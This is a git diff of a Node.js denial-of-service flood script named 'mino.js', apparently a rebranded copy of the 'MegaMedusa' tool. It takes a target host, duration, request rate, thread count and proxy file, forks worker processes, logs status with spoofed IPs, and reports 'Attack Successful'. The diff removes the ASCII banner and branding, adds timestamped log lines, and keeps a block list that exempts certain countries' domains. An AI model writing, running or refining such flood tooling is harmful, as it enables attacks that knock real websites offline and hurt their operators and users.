@@ -1,4 +1,3 @@
-
 const net = require('net');
 const http2 = require("http2");
 const tls = require('tls');
@@ -13,8 +12,19 @@ process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (err) {});
 
-if (process.argv.length < 
-    console.log(" node mino.js  <HOST> <TIME> <RPS> <THREADS> <PROXY>."
+// Fungsi untuk mendapatkan timestamp
+function getTimestamp() {
+    const now = new Date();
+    return now.getFullYear() + '-' +
+           String(now.getMonth() + 1).padStart(2, '0') + '-' +
+           String(now.getDate()).padStart(2, '0') + ' ' +
+           String(now.getHours()).padStart(2, '0') + ':' +
+           String(now.getMinutes()).padStart(2, '0') + ':' +
+           String(now.getSeconds()).padStart(2, '0');
+}
+
+if (process.argv.length < 7) {
+    console.log(" node mino.js  <HOST> <TIME> <RPS> <THREADS> <PROXY>.");
     process.exit();
 }
 
@@ -30,7 +40,7 @@ const domain = process.argv[2];
 const parsedUrl = new URL(domain);
 const blockedDomain = ['.id', ".my", ".ps", "go.id", '.lb', '.ir', ".bd", '.ye', ".iq", '-ye', "malaysia", "palestine", 'indonesia', "bangladesh", "yemen", ".bn", '.tr'];
 if (blockedDomain.some(d => parsedUrl.hostname.toLowerCase().endsWith(d))) {
-    console.log("[Waring] This Domain " + parsedUrl.hostname + " blocked");
+    console.log("[" + getTimestamp() + "] -> Waring: This Domain " + parsedUrl.hostname + " blocked");
     process.exit(1);
 }
 
@@ -44,9 +54,9 @@ function getStatus() {
         'httpsAgent': agent
     });
     Promise.race([request, timeout]).then(res => {
-        console.log("[MegaMedusa] -> (" + ip_spoof() + ") / " + getTitleFromHTML(res.data) + " (" + res.status + ")");
+        console.log("[" + getTimestamp() + "] -> (" + ip_spoof() + ") / " + getTitleFromHTML(res.data) + " (" + res.status + ")");
     }).catch(err => {
-        console.log("[MegaMedusa] -> " + err.message);
+        console.log("[" + getTimestamp() + "] -> " + err.message);
     });
 }
 
@@ -94,25 +104,20 @@ const args = {
 
 const os = require('os');
 if (cluster.isMaster) {
-    console.clear();
-    console.log("░█▀▄▀█ █▀▀ █▀▀▀ █▀▀█ ░█▀▄▀█ █▀▀ █▀▀▄ █──█ █▀▀ █▀▀█ ");
-    console.log("░█░█░█ █▀▀ █─▀█ █▄▄█ ░█░█░█ █▀▀ █──█ █──█ ▀▀█ █▄▄█ ");
-    console.log("░█──░█ ▀▀▀ ▀▀▀▀ ▀──▀ ░█──░█ ▀▀▀ ▀▀▀─ ─▀▀▀ ▀▀▀ ▀──▀ V3.2 ");
-    console.log("--------------------------------------------");
+    // Tampilkan informasi tanpa banner
     console.log("-> Target ⚡️ : " + process.argv[2]);
     console.log("-> Time ⏳ : " + process.argv[3]);
     console.log("-> Rate 💣 : " + process.argv[4]);
     console.log("-> Thread ⚙️ : " + process.argv[5]);
     console.log("-> ProxyFile 🗃 : " + process.argv[6]);
-    console.log("--------------------------------------------");
 
     for (let i = 1; i <= process.argv[5]; i++) {
         cluster.fork();
-        console.log("[MegaMedusa] -> Engine " + i + " Started");
+        console.log("[" + getTimestamp() + "] -> thread " + i + " send");
     }
     setInterval(getStatus, 2000);
     setTimeout(() => {
-        console.log("[MegaMedusa] -> Attack Successful ✅");
+        console.log("[" + getTimestamp() + "] -> Attack Successful ✅");
         process.exit(1);
     }, process.argv[3] * 1000);
 } else {
